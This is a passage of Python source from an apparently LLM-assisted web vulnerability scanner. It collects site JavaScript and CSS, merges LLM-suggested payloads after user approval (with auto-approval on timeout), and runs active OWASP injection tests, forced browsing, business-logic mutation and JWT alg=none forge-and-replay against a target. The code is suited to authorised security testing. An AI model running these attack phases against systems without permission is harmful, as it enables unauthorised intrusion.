                    _ls_sw = _e_sw.get("local_source") if isinstance(_e_sw, dict) else None
                    if _ls_sw:
                        _used_names_sw.add(_ls_sw.rsplit("/", 1)[-1])
                for _abs_sw, _entry_sw in _cand_js.items():
                    if GLOBAL_STATE.stop_event.is_set():
                        break
                    _is_ext_sw = bool(_entry_sw.get("external"))
                    if _is_ext_sw:
                        _ext_seen += 1
                        if _ext_seen > 50:
                            continue  # cap external fetches
                    try:
                        if _is_ext_sw:
                            # Plain GET — CDNs are public; no session needed.
                            _resp_sw = await asyncio.wait_for(
                                page.context.request.get(_abs_sw, timeout=10000),
                                timeout=12.0,
                            )
                        else:
                            async with rate_limiter.slot():
                                _resp_sw = await asyncio.wait_for(
                                    page.context.request.get(_abs_sw, timeout=10000),
                                    timeout=12.0,
                                )
                        if _resp_sw.status >= 400:
                            continue
                        _body_sw = await asyncio.wait_for(_resp_sw.text(), timeout=5.0)
                        if not _body_sw or len(_body_sw) < 20:
                            continue
                        _stem_sw = _entry_sw.get("filename") or "script"
                        _stem_sw = re.sub(r"[^A-Za-z0-9._-]", "_", _stem_sw) or "script"
                        if not _stem_sw.endswith(".js"):
                            _stem_sw += ".js"
                        _name_sw = _stem_sw
                        _n_sw = 2
                        while _name_sw in _used_names_sw:
                            _name_sw = f"{_stem_sw.rsplit('.', 1)[0]}_{_n_sw}.js"
                            _n_sw += 1
                        _used_names_sw.add(_name_sw)
                        (_js_dir_sw / _name_sw).write_text(_body_sw, encoding="utf-8")
                        _entry_sw["local_source"] = f"js_source/{_name_sw}"
                        _js_entries_sw.append(_entry_sw)
                        if _is_ext_sw:
                            _saved_ext += 1
                            external_js_fetched.append({
                                "url": _abs_sw,
                                "host": urlparse(_abs_sw).hostname or "",
                            })
                        else:
                            _saved_same += 1
                    except Exception:
                        continue
                if _saved_same or _saved_ext:
                    try:
                        _js_path_sw.write_text(
                            json.dumps(_js_entries_sw, indent=2, ensure_ascii=False,
                                       default=str),
                            encoding="utf-8")
                    except Exception as _e_sw:
                        logger.log("sitemap_sweep", f"javascripts.json rewrite failed: {_e_sw}")
                logger.log("sitemap_sweep",
                           f"js: +{_saved_same} same-origin, +{_saved_ext} external/CDN "
                           f"saved to js_source/ (of {len(_cand_js)} candidate script URLs)")

                # --- CSS collection over the FULL page set (mirror of the JS
                # pass above) --- every <link rel=stylesheet> is listed in
                # stylesheets.json and its content saved to css_source/
                # (same-origin authenticated via the browser context;
                # external/CDN via plain GET, cap 50) so the "Analyze CSS
                # with AI" pass can reason about exfil beacons, secrets in
                # comments, internal-host leaks and CSS-exfiltration selectors
                # the way the JS pass does for scripts.
                _css_path_sw = output_dir / "stylesheets.json"
                _css_entries_sw: List[Dict[str, Any]] = []
                try:
                    _loaded_css = json.loads(_css_path_sw.read_text(encoding="utf-8"))
                    if isinstance(_loaded_css, list):
                        _css_entries_sw = _loaded_css
                except Exception:
                    _css_entries_sw = []
                _known_css_urls = {str(e.get("url", "")) for e in _css_entries_sw
                                   if isinstance(e, dict)}
                # href may come before or after rel in the tag — match both orders.
                _link_re_sw = re.compile(
                    r'<link[^>]+rel=["\']stylesheet["\'][^>]+href=["\']([^"\']+)["\']'
                    r'|<link[^>]+href=["\']([^"\']+)["\'][^>]+rel=["\']stylesheet["\']',
                    re.I)
                _cand_css: Dict[str, Dict[str, Any]] = {}
                for _src_url_sw, _html_sw in page_sources.items():
                    for _m_sw in _link_re_sw.finditer(_html_sw or ""):
                        _raw_sw = _m_sw.group(1) or _m_sw.group(2)
                        if not _raw_sw:
                            continue
                        try:
                            _abs_sw = urljoin(_src_url_sw, _raw_sw)
                        except Exception:
                            continue
                        if _abs_sw in _known_css_urls or _abs_sw in _cand_css:
                            if _abs_sw in _cand_css:
                                if _src_url_sw not in _cand_css[_abs_sw]["found_on"]:
                                    _cand_css[_abs_sw]["found_on"].append(_src_url_sw)
                            continue
                        _pu_sw = urlparse(_abs_sw)
                        _css_host_sw = (_pu_sw.hostname or "").lower()
                        _cand_css[_abs_sw] = {
                            "url": _abs_sw,
                            "found_on": [_src_url_sw],
                            "external": bool(_css_host_sw and _tgt_host_sw
                                             and _css_host_sw != _tgt_host_sw),
                            "filename": _pu_sw.path.rsplit("/", 1)[-1] or _abs_sw,
                        }
                _css_same = 0
                _css_ext = 0
                _css_ext_seen = 0
                _css_dir_sw = output_dir / "css_source"
                _css_dir_sw.mkdir(parents=True, exist_ok=True)
                _css_used_sw: set = set()
                for _e_sw in _css_entries_sw:
                    _ls_sw = _e_sw.get("local_source") if isinstance(_e_sw, dict) else None
                    if _ls_sw:
                        _css_used_sw.add(_ls_sw.rsplit("/", 1)[-1])
                for _abs_sw, _entry_sw in _cand_css.items():
                    if GLOBAL_STATE.stop_event.is_set():
                        break
                    _is_ext_sw = bool(_entry_sw.get("external"))
                    if _is_ext_sw:
                        _css_ext_seen += 1
                        if _css_ext_seen > 50:
                            continue  # cap external fetches
                    try:
                        if _is_ext_sw:
                            # Plain GET — CDN stylesheets are public; no session.
                            _resp_sw = await asyncio.wait_for(
                                page.context.request.get(_abs_sw, timeout=10000),
                                timeout=12.0,
                            )
                        else:
                            async with rate_limiter.slot():
                                _resp_sw = await asyncio.wait_for(
                                    page.context.request.get(_abs_sw, timeout=10000),
                                    timeout=12.0,
                                )
                        if _resp_sw.status >= 400:
                            continue
                        _body_sw = await asyncio.wait_for(_resp_sw.text(), timeout=5.0)
                        if not _body_sw or len(_body_sw) < 20:
                            continue
                        _stem_sw = _entry_sw.get("filename") or "stylesheet"
                        _stem_sw = re.sub(r"[^A-Za-z0-9._-]", "_", _stem_sw) or "stylesheet"
                        if not _stem_sw.endswith(".css"):
                            _stem_sw += ".css"
                        _name_sw = _stem_sw
                        _n_sw = 2
                        while _name_sw in _css_used_sw:
                            _name_sw = f"{_stem_sw.rsplit('.', 1)[0]}_{_n_sw}.css"
                            _n_sw += 1
                        _css_used_sw.add(_name_sw)
                        (_css_dir_sw / _name_sw).write_text(_body_sw, encoding="utf-8")
                        _entry_sw["local_source"] = f"css_source/{_name_sw}"
                        _css_entries_sw.append(_entry_sw)
                        if _is_ext_sw:
                            _css_ext += 1
                            external_css_fetched.append({
                                "url": _abs_sw,
                                "host": urlparse(_abs_sw).hostname or "",
                            })
                        else:
                            _css_same += 1
                    except Exception:
                        continue
                if _css_same or _css_ext:
                    try:
                        _css_path_sw.write_text(
                            json.dumps(_css_entries_sw, indent=2, ensure_ascii=False,
                                       default=str),
                            encoding="utf-8",
                        )
                    except Exception as _e_sw:
                        logger.log("sitemap_sweep", f"stylesheets.json rewrite failed: {_e_sw}")
                logger.log("sitemap_sweep",
                           f"css: +{_css_same} same-origin, +{_css_ext} external/CDN "
                           f"saved to css_source/ (of {len(_cand_css)} candidate stylesheet URLs)")

                # --- Persist page_sources (full sitemap set) ---
                try:
                    (output_dir / "page_sources.json").write_text(
                        json.dumps(page_sources, indent=2, ensure_ascii=False,
                                   default=str),
                        encoding="utf-8",
                    )
                except Exception as _e_sw:
                    logger.log("page_sources_save",
                               f"failed to rewrite page_sources.json: {_e_sw}")

                # --- Rebuild the regex inventory over the full page set ------
                try:
                    _si_rerun = SoftwareInventoryAnalyzer(logger).analyze(
                        header_records=header_records,
                        page_sources=page_sources,
                    )
                    (output_dir / "software_inventory.json").write_text(
                        json.dumps(_si_rerun, indent=2, ensure_ascii=False,
                                   default=str),
                        encoding="utf-8",
                    )
                    software_inventory = _si_rerun
                    logger.log("software_inventory_rerun",
                               f"rebuilt over {len(page_sources)} page(s): "
                               f"{len(_si_rerun.get('items', []))} item(s)")
                except Exception as _e_sw:
                    logger.log("software_inventory_rerun", f"failed: {_e_sw}")
            except Exception as e:
                logger.log("sitemap_sweep", f"sweep failed: {e}")

        # --- Step 6.5: LLM-assisted planning (if --llm-assist) ---
        # The LLM analyses the crawl results + attack surface and suggests:
        #   - priority inputs to test first
        #   - custom tech-stack-specific payloads
        #   - additional URLs to crawl
        # The plan is saved to llm_plan.json for the engineer's audit.
        # The LLM NEVER executes anything — we merge its suggestions into
        # the existing payload list + input order, then proceed normally.
        llm_plan: Optional[Dict[str, Any]] = None
        if "llm_plan" in completed_phases:
            # Resumed scan — use the saved LLM plan instead of re-running.
            logger.log("phase", "RESUMED: skipping LLM-assisted planning")
            llm_plan = saved_llm_plan
            # If the saved plan has custom payloads, merge them (same as
            # the non-resume path below).
            if llm_plan and llm_plan.get("custom_payloads"):
                existing = set(payloads)
                new_payloads = [p for p in _sanitize_llm_payloads(llm_plan["custom_payloads"])
                                if p not in existing]
                payloads = payloads + new_payloads
                owasp_scanner.payloads = payloads
                logger.log("llm_plan_applied",
                           f"RESUMED: re-applied {len(new_payloads)} custom "
                           f"payloads from saved plan; total now {len(payloads)}")
            if llm_plan and llm_plan.get("priority_inputs"):
                logger.log("llm_plan_applied",
                           f"RESUMED: re-applied {len(llm_plan['priority_inputs'])} "
                           f"priority inputs from saved plan")
        elif args.llm_assist and not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting LLM-assisted planning")
            GLOBAL_STATE.current_phase = "llm_planner"
            planner = LLMPlanner(llm_adapter, logger)
            llm_plan = await planner.plan(
                target_url=args.url,
                crawl_map=crawl_map,
                attack_surface=attack_surface,
                header_records=header_records,
            )
            # Save the plan to disk for the audit trail + the web UI.
            plan_path = output_dir / "llm_plan.json"
            plan_path.write_text(
                json.dumps(llm_plan, indent=2, ensure_ascii=False,
                           default=str),
                encoding="utf-8",
            )
            logger.log("llm_plan_saved", f"path={plan_path.name}")

            # --- PAUSE FOR USER APPROVAL ---
            # The LLM plan contains custom payloads + priority inputs that
            # will be merged into the active scan. We do NOT auto-merge —
            # the user must review the plan and click "Approve" in the UI
            # before the scan continues.
            #
            # We create a "llm_plan_pending_approval" marker file and wait
            # for the user to either:
            #   - Approve: creates "llm_plan_approved.json" → we merge + continue
            #   - Reject:  creates "llm_plan_rejected.json" → we skip merge + continue
            #   - Timeout: if no response in 10 minutes, we auto-approve
            #     (the scan can't hang forever waiting for approval)
            pending_marker = output_dir / "llm_plan_pending_approval"
            approved_marker = output_dir / "llm_plan_approved.json"
            rejected_marker = output_dir / "llm_plan_rejected.json"

            # Write the pending marker so the UI knows to show the approval UI
            pending_marker.write_text(json.dumps({
                "status": "pending_approval",
                "plan_path": str(plan_path.name),
                "created_at": datetime.now(timezone.utc).isoformat(),
                "custom_payloads_count": len(llm_plan.get("custom_payloads", [])),
                "priority_inputs_count": len(llm_plan.get("priority_inputs", [])),
                "additional_urls_count": len(llm_plan.get("additional_urls", [])),
                "reasoning": llm_plan.get("reasoning", "")[:500],
            }, indent=2), encoding="utf-8")
            logger.log("llm_plan_awaiting_approval",
                       f"plan saved — waiting for user approval in the UI "
                       f"({len(llm_plan.get('custom_payloads', []))} custom payloads, "
                       f"{len(llm_plan.get('priority_inputs', []))} priority inputs)")

            # Poll for approval (check every 2s, timeout after 10 minutes)
            approval_timeout = 600  # 10 minutes
            poll_start = time.time()
            approved = False
            while not GLOBAL_STATE.stop_event.is_set():
                if approved_marker.exists():
                    approved = True
                    logger.log("llm_plan_approved", "user approved the LLM plan")
                    break
                if rejected_marker.exists():
                    approved = False
                    logger.log("llm_plan_rejected", "user rejected the LLM plan — proceeding with default payloads")
                    break
                elapsed = time.time() - poll_start
                if elapsed > approval_timeout:
                    approved = True  # auto-approve after timeout
                    logger.log("llm_plan_auto_approved",
                               f"auto-approved after {approval_timeout}s timeout "
                               f"(no user response)")
                    break
                await asyncio.sleep(2)

            # Clean up markers
            for marker in (pending_marker, approved_marker, rejected_marker):
                try:
                    marker.unlink(missing_ok=True)
                except Exception:
                    pass

            if not approved:
                # User rejected — skip the merge, use default payloads.
                # BUT save the rejected payloads to a file so the user can
                # review them later and add them to bin/payloads.txt if desired.
                logger.log("llm_plan_skipped", "using default payloads (plan rejected)")
                rejected_payloads = llm_plan.get("custom_payloads", [])
                if rejected_payloads:
                    # Save to the scan's output dir for this scan's audit trail
                    rejected_path = output_dir / "rejected_llm_payloads.txt"
                    rejected_content = (
                        f"# Custom payloads suggested by the LLM but REJECTED by the user.\n"
                        f"# Saved: {datetime.now(timezone.utc).isoformat()}\n"
                        f"# Target: {args.url}\n"
                        f"# Reasoning: {llm_plan.get('reasoning', '')[:500]}\n"
                        f"#\n"
                        f"# To use these in future scans, copy them into bin/payloads.txt\n"
                        f"# (Settings → Payloads tab) and click Save.\n"
                        f"#\n"
                    )
                    for p in rejected_payloads:
                        rejected_content += f"{p}\n"
                    rejected_path.write_text(rejected_content, encoding="utf-8")
                    logger.log("llm_payloads_saved_rejected",
                               f"saved {len(rejected_payloads)} rejected payloads to "
                               f"{rejected_path.name} — review and add to bin/payloads.txt "
                               f"if desired")

                    # ALSO save to a GLOBAL file (bin/llm_suggested_payloads.txt)
                    # that accumulates across all scans. This way the user can
                    # review ALL LLM-suggested payloads from all scans in one place.
                    global_payloads_path = Path(__file__).parent / "llm_suggested_payloads.txt"
                    try:
                        existing_global = ""
                        if global_payloads_path.exists():
                            existing_global = global_payloads_path.read_text(encoding="utf-8")
                        # Append new payloads (deduplicated)
                        new_section = (
                            f"\n# --- Scan: {args.url} at {datetime.now(timezone.utc).isoformat()} ---\n"
                            f"# Reasoning: {llm_plan.get('reasoning', '')[:300]}\n"
                        )
                        for p in rejected_payloads:
                            if p not in existing_global:
                                new_section += f"{p}\n"
                        with open(global_payloads_path, "a", encoding="utf-8") as f:
                            f.write(new_section)
                        logger.log("llm_payloads_saved_global",
                                   f"appended rejected payloads to {global_payloads_path.name} "
                                   f"(accumulates across scans for future review)")
                    except Exception as e:
                        logger.log("llm_payloads_save_error",
                                   f"failed to save to global file: {e}")
            else:
                # Merge the LLM's suggestions into the active-scan configuration.
                # 1. Add custom payloads to the payload list (deduplicated).
                custom_payloads = llm_plan.get("custom_payloads", [])
                if custom_payloads:
                    existing = set(payloads)
                    new_payloads = [p for p in _sanitize_llm_payloads(custom_payloads)
                                    if p not in existing]
                    payloads = payloads + new_payloads
                    # Update the OWASP scanner's payload list in-place.
                    owasp_scanner.payloads = payloads
                    logger.log("llm_plan_applied",
                               f"added {len(new_payloads)} custom payloads; "
                               f"total now {len(payloads)}")

                # 2. Reorder attack_surface so priority inputs come first.
                priority_names = set(llm_plan.get("priority_inputs", []))
                if priority_names:
                    # Stable sort: priority inputs first, then the rest in
                    # their original order.
                    attack_surface = sorted(
                        attack_surface,
                        key=lambda inp: 0 if inp.name in priority_names else 1,
                    )
                    GLOBAL_STATE.partial_attack_surface = attack_surface
                    logger.log("llm_plan_applied",
                               f"prioritised {len(priority_names)} input names: "
                               f"{list(priority_names)[:10]}")

                # 3. Log additional URLs + optionally crawl them.
                # By default, LLM-suggested URLs are NOT auto-crawled
                # (scope-escape risk). The engineer should review them
                # in llm_plan.json and decide.
                #
                # If --crawl-llm-urls is set, we crawl any URL that is
                # on the SAME domain as the target. URLs on other domains
                # are still skipped (use --allow-external for those).
                additional = llm_plan.get("additional_urls", [])
                if additional:
                    if getattr(args, 'crawl_llm_urls', False):
                        # Auto-crawl same-domain URLs.
                        from urllib.parse import urlparse as _urlparse
                        target_domain = _urlparse(args.url).hostname or ""
                        crawled_count = 0
                        for extra_url in additional[:10]:  # cap at 10
                            try:
                                extra_domain = _urlparse(extra_url).hostname or ""
                                if extra_domain and extra_domain == target_domain:
                                    logger.log("llm_url_crawl",
                                               f"crawling LLM-suggested URL: {extra_url}")
                                    try:
                                        async with rate_limiter.slot():
                                            await _pw(page.goto, extra_url,
                                                      wait_until="domcontentloaded",
                                                      timeout=10000, default=None)
                                            # Extract links from this page
                                            # and add them to the crawl map.
                                            extra_links = await _pw(
                                                page.evaluate,
                                                "() => Array.from(document.querySelectorAll('a[href]')).map(a => a.href)",
                                                default=[],
                                            )
                                            if extra_links:
                                                for link in extra_links:
                                                    if link not in [c.url for c in crawl_map]:
                                                        # Add to crawl_map as a CrawledURL
                                                        crawl_map.append(CrawledURL(
                                                            url=link,
                                                            status=200,
                                                            title="",
                                                            content_type="",
                                                            in_scope=True,
                                                            depth=args.depth,
                                                        ))
                                                crawled_count += 1
                                    except Exception as e:
                                        logger.log("llm_url_crawl_error",
                                                   f"failed to crawl {extra_url}: {e}")
                                else:
                                    logger.log("llm_url_skip",
                                               f"skipping LLM-suggested URL (different domain): {extra_url}")
                            except Exception:
                                pass
                        if crawled_count > 0:
                            logger.log("llm_url_crawl_done",
                                       f"crawled {crawled_count} LLM-suggested URLs "
                                       f"(same domain only). {len(crawl_map)} total URLs in crawl map.")
                    else:
                        logger.log("llm_plan_additional_urls",
                                   f"LLM suggested {len(additional)} additional URLs "
                                   f"to crawl (NOT auto-crawled — review llm_plan.json "
                                   f"or use --crawl-llm-urls to auto-crawl same-domain URLs): "
                                   f"{additional[:5]}")

                if llm_plan.get("llm_error"):
                    logger.log("llm_plan_warning",
                               f"LLM planner error: {llm_plan['llm_error']}")

            # Mark the LLM plan phase as complete so resume skips it.
            completed_phases.append("llm_plan")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records,
                            ssl_record=ssl_record,
                            crawl_map=crawl_map,
                            attack_surface=attack_surface,
                            llm_plan=llm_plan)

        # --- Step 7: Passive OWASP checks ---
        if "passive" in completed_phases:
            logger.log("phase", "RESUMED: skipping passive checks")
            passive = saved_passive or PassiveFindings()
        elif not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting passive OWASP checks")

            # --- CRITICAL: ensure the page is alive before passive scan. ---
            # By this point the page has been used by:
            #   - header capture
            #   - crawl
            #   - attack surface mapping (up to 30 page.goto calls)
            #   - input surface mapping (up to 30 page.goto calls)
            #   - directory brute-forcing
            #   - LLM planning (up to 10 min idle wait for approval)
            # ANY of these can leave the page dead (especially after the
            # 10-min LLM approval wait — the browser may have been killed
            # by the OS OOM-killer, or the connection just timed out).
            #
            # If we don't recover here, EVERY passive check (cookies,
            # mixed content, headers, screenshot) fails with
            # "Target page, context or browser has been closed" — which
            # is exactly the symptom the user reported.
            #
            # _ensure_alive_page() does a tiered recovery:
            #   1. quick health check (page.content() with 5s timeout)
            #   2. context.new_page() (cheap, ~50ms)
            #   3. full Playwright restart (pkill + relaunch, ~5s)
            # It returns the new (page, context, browser) — we MUST
            # re-bind our locals.
            try:
                _pre_passive_cookies = []
                if context is not None:
                    try:
                        _pre_passive_cookies = await asyncio.wait_for(
                            context.cookies(), timeout=3.0)
                    except Exception:
                        _pre_passive_cookies = []
                page, context, browser = await _ensure_alive_page(
                    page=page,
                    context=context,
                    browser=browser,
                    target_url=args.url,
                    logger=logger,
                    saved_cookies=_pre_passive_cookies,
                    tag="passive_pre_check",
                )
            except Exception as e:
                logger.log("phase",
                           f"passive_pre_check recovery wrapper failed: "
                           f"{type(e).__name__}: {e}")

            # Best-effort navigation — even if _ensure_alive_page failed
            # to verify, we still try (the page might be alive but the
            # verify call timed out for unrelated reasons).
            try:
                await _pw(page.goto, args.url, wait_until="domcontentloaded",
                                timeout=15000, default=None)
            except Exception as e:
                logger.log("phase", f"passive-scan navigation warning: {e}")

            passive = await owasp_scanner.passive_scan(
                page, header_records, args.url, crawl_map,
            )
            # Save passive findings as standalone JSON for the web UI
            try:
                passive_path = output_dir / "passive_findings.json"
                passive_path.write_text(
                    json.dumps(asdict(passive), indent=2, ensure_ascii=False,
                               default=str),
                    encoding="utf-8",
                )
            except Exception:
                pass
            completed_phases.append("passive")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records,
                            ssl_record=ssl_record,
                            crawl_map=crawl_map,
                            attack_surface=attack_surface,
                            passive=passive,
                            login_succeeded=login_succeeded)
        else:
            passive = PassiveFindings()

        # --- Step 8: Evidence — before screenshot ---
        if not GLOBAL_STATE.stop_event.is_set():
            await evidence_engine.capture_before(page, "before")

        # --- Step 9: Active OWASP checks ---
        if "active" in completed_phases:
            logger.log("phase", "RESUMED: skipping active checks")
            findings = saved_findings
        elif args.crawl_only:
            # Crawl Only mode — skip active fuzzing entirely
            logger.log("phase", "CRAWL ONLY MODE — skipping active checks "
                                "(crawl + headers + SSL + attack surface + "
                                "directory brute complete, 0 payloads injected)")
            findings = []
            completed_phases.append("active")
        elif not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase",
                       f"starting active checks ({len(attack_surface)} inputs "
                       f"x {len(payloads)} payloads)")
            new_findings = await owasp_scanner.active_scan(page, attack_surface)
            # CRITICAL: Merge with existing findings from GLOBAL_STATE.
            # When using --skip-tests (Kill Chrome & Restart), the scanner
            # loads existing findings from findings.json into
            # GLOBAL_STATE.partial_findings BEFORE active_scan runs.
            # active_scan appends new findings to GLOBAL_STATE.partial_findings
            # AND returns them in the local `new_findings` list. But the
            # local list does NOT include the pre-existing findings — so if
            # we used it directly, the final findings.json write would
            # OVERWRITE the old findings with just the new ones.
            #
            # Fix: use GLOBAL_STATE.partial_findings (which has BOTH old
            # and new) as the authoritative findings list. Fall back to
            # new_findings only if partial_findings is empty (normal first
            # scan, no --skip-tests).
            if GLOBAL_STATE.partial_findings:
                findings = GLOBAL_STATE.partial_findings
                logger.log("phase",
                           f"active checks complete: {len(new_findings)} new "
                           f"findings recorded, {len(findings)} total "
                           f"(including {len(findings) - len(new_findings)} "
                           f"restored from previous run)")
            else:
                findings = new_findings
                logger.log("phase", f"active checks complete: "
                                    f"{len(findings)} findings recorded")
            completed_phases.append("active")
            save_scan_state(output_dir, completed_phases,
                            header_records=header_records,
                            ssl_record=ssl_record,
                            crawl_map=crawl_map,
                            attack_surface=attack_surface,
                            passive=passive,
                            findings=findings,
                            login_succeeded=login_succeeded)

            # CRITICAL: After active_scan, the shared `page` is almost
            # certainly dead (the auto-recycle kills Chrome every 5 tests
            # via pkill). The post-scan phases (access control, deep logic,
            # evidence, report) need a working page.
            #
            # We MUST restart Playwright + browser + context + page from
            # scratch using GLOBAL_STATE (which the retry loop updated).
            # The local `context` and `browser` variables from active_scan
            # are stale — they point to the dead browser.
            try:
                # Kill any remaining Chrome processes
                import subprocess as _sp_post
                _sp_post.run("pkill -9 -f chromium; pkill -9 -f chrome; pkill -9 -f headless; pkill -9 -f chrome-headless-shell; pkill -9 -f remote-debugging-pipe", shell=True, timeout=5, capture_output=True)

                # Restart Playwright entirely (same as retry loop)
                try:
                    if GLOBAL_STATE.playwright_ctx is not None:
                        try:
                            await asyncio.wait_for(GLOBAL_STATE.playwright_ctx.stop(), timeout=3.0)
                        except Exception:
                            pass
                except Exception:
                    pass
                from playwright.async_api import async_playwright as _apw_post
                pw = await _apw_post().start()
                GLOBAL_STATE.playwright_ctx = pw

                # New browser + context + page
                browser = await asyncio.wait_for(
                    pw.chromium.launch(headless=True, args=["--no-sandbox"]),
                    timeout=15.0)
                GLOBAL_STATE.browser = browser
                context = await asyncio.wait_for(
                    browser.new_context(
                        user_agent=("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                                    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
                        viewport={"width": 1280, "height": 720},
                        ignore_https_errors=True),
                    timeout=10.0)
                # Restore cookies — try to get from the old context first,
                # fall back to empty list (unauthenticated scan has no cookies).
                # Note: 'initial_cookies' is local to active_scan and not
                # accessible here. We use an empty list for unauthenticated
                # scans (which is correct — there are no cookies to restore).
                # For authenticated scans, the login was already performed
                # before active_scan started, and the browser context had
                # the cookies. Since we're restarting the browser, those
                # cookies are lost — but the login URL + credentials are
                # still available, so the access control tester can re-login.
                # For now, just create the page without cookies.
                page = await asyncio.wait_for(context.new_page(), timeout=5.0)
                # Verify the page works
                await asyncio.wait_for(page.set_content("<html></html>"), timeout=3.0)
                logger.log("phase", "browser + page recreated for post-scan phases")
            except Exception as e:
                logger.log("phase", f"warning: failed to recreate page: {e} — post-scan phases may fail")
        else:
            findings = GLOBAL_STATE.partial_findings

        # --- CRITICAL: Check if the scan was paused (session expiry) ---
        # If stop_event is set after active_scan, the scan was paused
        # for re-login (or the user clicked Stop). We must NOT proceed
        # to post-scan phases (access control, deep logic, evidence,
        # report, LLM summary) — the scan is incomplete.
        #
        # Without this check, the scan would:
        #   1. Skip the remaining active tests (stop_event broke the loop)
        #   2. Run the multi-field pass (bug — now fixed)
        #   3. Run access control + deep logic + evidence + report
        #   4. Log scan_complete with interrupted=True
        #   5. The scanner exits → scanner-runner marks it as "paused"
        #      BUT a report was already generated with partial data,
        #      which is misleading.
        #
        # With this check, the scan exits early with a clear message.
        # The user can then re-login and click Resume to continue.
        if GLOBAL_STATE.stop_event.is_set() and not args.crawl_only:
            # Check if it was a session pause (vs. user Stop)
            pause_path_check = output_dir / "pause_state.json"
            is_session_pause = pause_path_check.exists()
            if is_session_pause:
                logger.log("phase",
                           "SCAN PAUSED — session expired. Post-scan phases "
                           "(access control, deep logic, report) are SKIPPED. "
                           "Re-login and click Resume to continue from where "
                           "the scan stopped.")
            else:
                logger.log("phase",
                           "SCAN STOPPED by user. Post-scan phases are SKIPPED. "
                           "Partial findings have been saved.")

            # Save partial findings so the user can see what was found
            # before the pause/stop.
            try:
                findings_data = []
                for f in _dedupe_findings_by_id(findings if findings else GLOBAL_STATE.partial_findings):
                    d = asdict(f)
                    if d.get("screenshot_path"):
                        d["screenshot_path"] = os.path.basename(d["screenshot_path"])
                        d["has_screenshot"] = True
                    else:
                        d["has_screenshot"] = False
                    findings_data.append(d)
                findings_json_path = output_dir / "findings.json"
                findings_json_path.write_text(
                    json.dumps(findings_data, indent=2, ensure_ascii=False,
                               default=str),
                    encoding="utf-8",
                )
                logger.log("findings_saved",
                           f"path={findings_json_path.name} "
                           f"count={len(findings_data)} (partial — scan paused)")
            except Exception as e:
                logger.log("findings_save_error",
                           f"failed to save partial findings: {e}")

            # Exit without generating a report or logging scan_complete.
            # The scanner-runner's finalizeScan will detect pause_state.json
            # and mark the scan as "paused" in the DB; for a user Stop there
            # is no pause_state, so the exit CODE must say "interrupted" —
            # a bare `return` yields exit code 0 which the runner mapped to
            # "completed".
            logger.log("scan_exited_paused",
                       f"scan exited without completing — "
                       f"{'session expired' if is_session_pause else 'user stop'}. "
                       f"Partial findings saved. Resume to continue.")
            if is_session_pause:
                return
            return EXIT_INTERRUPTED

        # --- Step 9.5: Access Control Testing (if --test-access-control) ---
        # Forced browsing: clear all cookies, re-visit in-scope URLs,
        # flag any that are accessible without authentication as A01 BAC.
        if args.test_access_control and not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting access control testing (forced browsing)")
            ac_tester = AccessControlTester(
                rate_limiter=rate_limiter,
                logger=logger,
                evidence_dir=evidence_dir,
            )
            login_was_performed = bool(args.login_url)
            bac_findings = await ac_tester.test(
                page=page,
                crawl_map=crawl_map,
                login_was_performed=login_was_performed,
            )
            findings = findings + bac_findings
            logger.log("phase", f"access control testing complete: "
                                f"{len(bac_findings)} BAC findings added")

        # --- Step 9.6: Deep Logic Testing (if --deep-logic) ---
        # EXPERIMENTAL: Tests for business logic flaws by mutating numeric
        # parameters (negative, zero, extreme) and comparing responses to
        # the baseline. Disabled by default — slow + produces false positives.
        deep_logic_findings: List[Dict[str, Any]] = []
        if args.deep_logic and not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting deep logic testing (EXPERIMENTAL)")
            dl_tester = DeepLogicTester(
                rate_limiter=rate_limiter,
                logger=logger,
                evidence_dir=evidence_dir,
            )
            deep_logic_findings = await dl_tester.test(
                page=page,
                crawl_map=crawl_map,
                attack_surface=attack_surface,
                target_url=args.url,
            )
            # Save to deep_logic_findings.json for the web UI.
            dl_path = output_dir / "deep_logic_findings.json"
            dl_path.write_text(
                json.dumps(deep_logic_findings, indent=2, ensure_ascii=False,
                           default=str),
                encoding="utf-8",
            )
            logger.log("phase", f"deep logic testing complete: "
                                f"{len(deep_logic_findings)} business logic findings")

        # --- Step 9.7: JWT Analysis (passive claims + alg=none forge/replay) --
        # Reads jwt_tokens.json (collected during passive_scan) and runs:
        #   1. Weak/missing-claims validation (passive, always runs).
        #   2. alg=none forge + replay (only if the scan is authenticated).
        # Findings are appended to the global findings list so Step 10.1
        # persists them and they show in the OWASP tab under A07.
        if "jwt_analysis" in completed_phases:
            logger.log("phase", "RESUMED: skipping JWT analysis")
        elif not GLOBAL_STATE.stop_event.is_set():
            logger.log("phase", "starting JWT analysis")
            GLOBAL_STATE.current_phase = "jwt_analysis"
            jwt_path = output_dir / "jwt_tokens.json"
            jwt_tokens: List[Dict[str, Any]] = []
            try:
                if jwt_path.exists():
                    loaded = json.loads(jwt_path.read_text(encoding="utf-8"))
                    if isinstance(loaded, list):
                        jwt_tokens = loaded
            except Exception:
                jwt_tokens = []
            jwt_analyzer_inst = JWTAnalyzer(logger, evidence_dir)
            jwt_findings: List[Finding] = []
            # 1. Passive weak/missing-claims validation (always).
            jwt_findings.extend(jwt_analyzer_inst.analyze_claims(jwt_tokens))
            # 2. alg=none forge + replay (only if authenticated + have a page).
            if is_authenticated and jwt_tokens and not GLOBAL_STATE.stop_event.is_set():
                try:
                    jwt_findings.extend(await jwt_analyzer_inst.analyze_alg_none(
                        page, args.url, jwt_tokens, rate_limiter,
                    ))
                except Exception as e:
                    logger.log("jwt_alg_none", f"phase failed: {type(e).__name__}: {e}")
            # Append to the global findings list so Step 10.1 includes them
            # (and the dedup-at-write path dedupes by finding_id). Avoid
            # double-add when findings IS partial_findings (same object).
            if jwt_findings:
                findings.extend(jwt_findings)
                if findings is not GLOBAL_STATE.partial_findings:
                    GLOBAL_STATE.partial_findings.extend(jwt_findings)
            logger.log("phase",
                       f"JWT analysis complete: {len(jwt_findings)} findings "
                       f"(analyzed {len(jwt_tokens)} tokens, "
                       f"authenticated={is_authenticated})")
            # Save a small audit record.
            try:
                (output_dir / "jwt_analysis.json").write_text(
                    json.dumps({
                        "tokens_analyzed": len(jwt_tokens),
